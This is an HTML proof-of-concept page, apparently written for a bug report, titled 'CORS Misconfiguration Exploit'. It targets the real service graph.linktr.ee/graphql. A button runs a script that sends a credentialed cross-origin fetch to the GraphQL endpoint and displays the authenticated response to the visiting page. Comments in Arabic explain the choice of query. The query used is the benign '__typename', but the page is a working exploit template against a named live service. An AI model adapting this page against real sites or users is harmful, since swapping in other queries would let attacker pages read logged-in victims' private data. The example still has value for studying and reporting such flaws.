<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vulnerability PoC: Authenticated CORS Bypass</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d1117; color: #c9d1d9; padding: 40px; text-align: center; }
        .container { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 30px; display: inline-block; min-width: 500px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h1 { color: #f85149; font-size: 22px; }
        button { background-color: #238636; color: white; border: none; padding: 15px 30px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; transition: 0.2s; }
        button:hover { background-color: #2ea043; }
        #output { margin-top: 25px; text-align: left; background: #0d1117; padding: 20px; border-radius: 6px; border: 1px solid #30363d; color: #7ee787; white-space: pre-wrap; font-family: monospace; overflow-x: auto; }
    </style>
</head>
<body>

    <div class="container">
        <h1>CORS Misconfiguration Exploit</h1>
        <p>Target: <code>graph.linktr.ee/graphql</code></p>
        
        <button onclick="runExploit()">EXECUTE AUTHENTICATED FETCH</button>

        <div id="output">Status: Ready. Please ensure you are logged in to Linktree.</div>
    </div>

    <script>
        async function runExploit() {
            const out = document.getElementById("output");
            out.innerHTML = "[*] Status: Sending Authenticated GET Request...\n";

            // نستخدم استعلام __typename لأنه الأكثر استقراراً لإثبات الـ SOP Bypass
            const query = "query { __typename }";
            const url = `https://graph.linktr.ee/graphql?query=${encodeURIComponent(query)}`;

            try {
                // استخدام fetch مع credentials: 'include' لإثبات إرسال الكوكيز
                const response = await fetch(url, {
                    method: 'GET',
                    credentials: 'include'
                });

                const data = await response.json();

                if (data.data) {
                    out.innerHTML = "<b style='color:#7ee787'>[+] SUCCESS: Authenticated Data Retrived!</b>\n\n";
                    out.innerHTML += "<b>Response Data:</b>\n" + JSON.stringify(data, null, 4);
                    out.innerHTML += "\n\n<b>Technical Impact:</b> The server reflected the Origin and allowed reading the response via authenticated session.";
                } else {
                    out.innerHTML = "<b style='color:#ffa657'>[!] Server Replied but with GraphQL Errors:</b>\n\n" + JSON.stringify(data, null, 4);
                }
            } catch (err) {
                out.innerHTML = "<b style='color:#f85149'>[-] Error:</b> " + err.message + "\nCheck browser console for CORS/Network blocks.";
            }
        }
    </script>
</body>
</html>
